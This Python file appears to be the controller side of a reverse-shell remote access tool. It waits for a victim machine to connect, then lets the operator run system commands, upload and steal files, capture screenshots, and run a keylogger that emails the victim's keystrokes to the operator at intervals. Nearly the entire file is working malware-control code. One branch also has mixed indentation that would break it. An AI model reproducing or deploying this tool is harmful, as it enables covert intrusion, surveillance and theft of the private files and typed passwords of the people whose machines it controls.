import socket
import sys
import os
import time
import smtplib
import threading
from PIL import Image
from email.message import EmailMessage

s=socket.socket()               #create server socket
client=socket.socket()          #create client socket
HOST = "192.168.221.144"        #server IP
PORT = 25967                    #server port
ebody=""                        #global variable used to store the email body
stop=0                          #global variable used to stop the mail function
buffer = 4096                   #size of buffer used to send data

def commands():                 #function to run system commands on the remote machine
	client.send("c".encode())       #gets the client program ready to receive commands
	while True:
		command = input("Enter command:")
		client.send(command.encode())           #sends command
		if command.lower() == "exit":
			break
		try:
			results = client.recv(buffer).decode()      #receives result
			print(results)
		except:
			pass                #try-except block to break out using ctrl+c if the sent command does not return a result but still stay within commands()


def download(file):             #function to download a file from the remote machine
	time.sleep(1)
	client.send("d".encode())       #gets the client program ready to send a file
	time.sleep(1)
	client.send(file.encode())
	time.sleep(1)
	check=client.recv(buffer).decode()  #receives the check value (whether the requested file exists)
	if check=="none":
		print("Invalid path or filename")
	else:
		file=os.path.basename(file)     #strips the path and saves just the file name
		data=client.recv(buffer)
		with open(file, "wb") as f:
			while data:
				try:
					if data.decode()=="done":       #checks if complete file data received
						print("File downloaded successfully")
						break
				except:
					pass
				f.write(data)               #writes data
				data=client.recv(buffer)    #receives data

def upload(file):               #function to upload a file to the remote machine
	time.sleep(1)
	client.send("u".encode())               #gets the client ready to receive a file
	time.sleep(1)
	if os.path.isfile(file):                #checks if file exists
		client.sendall("exists".encode())           #sends confirmation of file transfer beginning
		time.sleep(1)
		client.send(file.encode())      #sends file name
		time.sleep(1)
		with open(file, "rb") as f:
			data = f.read(buffer)           
			while data:
				if len(data)<buffer:
					client.sendall(data)        #sends file data
					print("File transferred successfully")
					time.sleep(2)
					client.sendall("done".encode())     #sends done on completion
					break
				client.sendall(data)
				data = f.read(buffer)
	else:
		print("Invalid path or filename")       #if file does not exist
		client.sendall("none".encode())            #sends reset command
		time.sleep(1)

def screengrab():               #function to capture a screenshot on the remote machine
	if not os.path.isdir("screenshots"):        #checks if directory named screenshots exists, if not, creates it
		os.mkdir("screenshots")
	time.sleep(1)
	client.send("s".encode())               #gets teh client ready to take a screenshot
	time.sleep(1)
	res1=int(client.recv(buffer).decode())      #receives image resolution
	res2=int(client.recv(buffer).decode())
	time.sleep(1)
	imgdata=b''
	while True:
		try:
			data=Image.frombytes('RGB',(res1,res2),imgdata) #checks if complete image data received
			break
		except:
			datapic=client.recv(buffer)             #receives image data
			imgdata+=datapic
	fname=time.strftime("%Y-%m-%d_%H:%M:%S", time.gmtime())     #uses current date and time to form image name
	path='screenshots/'+fname+'.png'
	data.save(path)                     #saves image
	print("Screenshot saved.")

def keylogger():            #function to run a keylogger on the remote machine
	global ebody,stop
	time.sleep(1)
	client.send("k".encode())
	email=input("Enter your email:")                            #email details, enter your details here if you do not want to enter them each time.
	password=input("Enter your password:")
	emserver=input("Enter the smtp server:")
	port=int(input("Enter the server port:"))
	interval=int(input("Enter how often you want the keylogs sent by email in seconds:"))
	check=client.recv(buffer).decode()                          #check if the keylogger is working on the temote machine
	time.sleep(1)
	def mail(email, password, emserver, port, interval):        #function to send emails
		global ebody,stop
		if stop==0:
			msg = EmailMessage()
			msg.set_content(ebody)
			currtime=time.strftime("%Y-%m-%d_%H:%M:%S", time.gmtime())
			msg['Subject'] = 'Keylogs - '+currtime
			msg['From'] = email
			msg['To'] = email
			server = smtplib.SMTP(host=emserver, port=port)
			server.starttls()
			server.login(email, password)
			server.send_message(msg)
			server.quit()
			timer = threading.Timer(interval=interval, function=mail,args=(email, password, emserver, port, interval))  #timer that resets each time after function executes
			timer.daemon = True
			timer.start()
			ebody=""
	try:
		if check=="OK":             #checks if the keylogger is functioning on the remote machine
			timer = threading.Timer(interval=interval, function=mail,args=(email, password, emserver, port, interval))      #starts timer to call the mail function
			timer.daemon = True
			timer.start()
			while True:             #loop to print the target's keypresses in the terminal
				ntext=client.recv(buffer).decode()
				ebody+=ntext
				sys.stdout.write(ntext)
				sys.stdout.flush()

		else:
			print("ERROR:\n 1.The client program must run with sudo privileges on the remote machine for the keylogger to function. \n 2.Possible error in email information entered.")
	except KeyboardInterrupt:       #to stop the keylogger
		stop=1                  #used to stop the mail timer
		selection()                #return to selection screen

def connect():      #function to receive connections from the remote machine
	global s,client
	s.bind((HOST, PORT))    #binds the server socket to the host and port 
	s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	s.listen(5)             #listens for 5 connections
	print(f"Server listening => {HOST}:{PORT} ...")
	client, client_address = s.accept()         #accepts connection from the client
	print(f"New connection established from => {client_address[0]}:{client_address[1]}")
	selection()         #calls the selection function

def endprogram():           #function to close all the sockets and terminate the client program
	client.send("t".encode())
	time.sleep(2)
	client.close()
	s.close()

def selection():        #function to let the user choose what they want to do on the remote machine
	print("Enter your option below. Use 'h' or 'help' for help.")
	opt=input("Enter option:")
	if opt in ("h","help"):
		print("Options: \n 'c' or 'command' to execute a system command. Use 'exit' to choose another option. If the system does not return a result use ctrl+c to send another system command. \n 'u' or 'upload' to upload a file to the remote system. \n 'd' or 'download' to download a file from the remote system. \n 's' or 'screengrab' to capture the screen of the remote system. \n 'k' or 'keylogger' to run a keylogger on the remote system and send these logs to your email. \n 'e' or 'executable' to convert the client reverse shell into an executable. \n 't' or 'terminate' to stop the reverse shell on the remote system.")
		selection()
	elif opt in ("c","command"):
		commands()
		selection()
	elif opt in ("u","upload"):
		args=input("Enter filename (enter the file path as well if the file is not in the same directory as the program)")
		upload(args)
		selection()
	elif opt in ("d","download"):
		args=input("Enter filename (enter the file path as well if the file is not in the same directory as the program)")
		download(args)
		selection()
	elif opt in ("s","screengrab"):
		screengrab()
		selection()
	elif opt in ("k","keylogger"):
		keylogger()
		selection()
	elif opt in ("e","executable"):
		client.send("e".encode())
        check=client.recv(buffer)
        print(check)
		selection()
	elif opt in ("t","terminate"):
		endprogram()
	else:
		print("Invalid option")
		selection()

connect()
